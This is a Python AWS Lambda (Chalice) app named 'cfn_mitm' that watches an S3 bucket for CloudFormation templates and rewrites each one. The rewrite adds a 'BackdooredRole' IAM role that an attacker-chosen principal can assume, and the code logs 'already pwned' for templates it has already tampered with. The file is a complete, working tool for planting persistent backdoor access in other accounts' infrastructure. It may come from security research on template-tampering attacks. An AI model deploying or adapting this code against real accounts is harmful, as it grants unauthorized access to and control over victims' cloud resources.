import json
import os

from chalice import Chalice
from chalice.app import S3Event

import boto3
import yaml
from typing import TYPE_CHECKING

app = Chalice(app_name="cfn_mitm")

if TYPE_CHECKING:
    import mypy_boto3_s3

sess = boto3.session.Session(
    aws_access_key_id=os.getenv('S3_AWS_ACCESS_KEY_ID'),
    aws_secret_access_key=os.getenv('S3_AWS_SECRET_ACCESS_KEY'),
    aws_session_token=os.getenv('S3_AWS_SESSION_TOKEN') or None,
)
s3: 'mypy_boto3_s3.S3Client' = sess.client('s3', region_name='us-east-1')

bucket = os.getenv('BUCKET')
if not bucket:
    raise UserWarning('No BUCKET environment variable found.')

@app.lambda_function(name='lambda_handler')
def lambda_handler(event: dict, context: dict):
    event = S3Event(event, context)

    arn = sess.client('sts').get_caller_identity()['Arn']
    print(f"Caller identity used for updating cross account S3 Objects: {arn}")

    update(event)

    return {
        "statusCode": 200,
        "body": '{ "message": "hello world"}',
    }


def update(event: 'S3Event'):
    resp = s3.get_object(Bucket=event.bucket, Key=event.key)
    body = resp['Body'].read()

    if b"BackdooredRole" in body:
        print("already pwned skipping")
        return

    new_body = add_role(body)
    s3.put_object(Bucket=event.bucket, Key=event.key, Body=new_body)


def add_role(cfn: bytes):
    cfn = yaml.safe_load(cfn)

    principal = os.environ['PRINCIPAL']
    if not principal:
        raise UserWarning("Could not find PRINCIPAL in the environment.")
    cfn['Resources']['BackdooredRole'] = {
        'Type': 'AWS::IAM::Role',
        'Properties': {
            'AssumeRolePolicyDocument': json.dumps(
                {
                    "Version": "2012-10-17",
                    "Statement": [
                        {
                            "Effect": "Allow",
                            "Principal": {"AWS": principal.strip()},
                            "Action": "sts:AssumeRole"
                        }
                    ]
                }
            )
        }
    }
    return yaml.safe_dump(cfn)

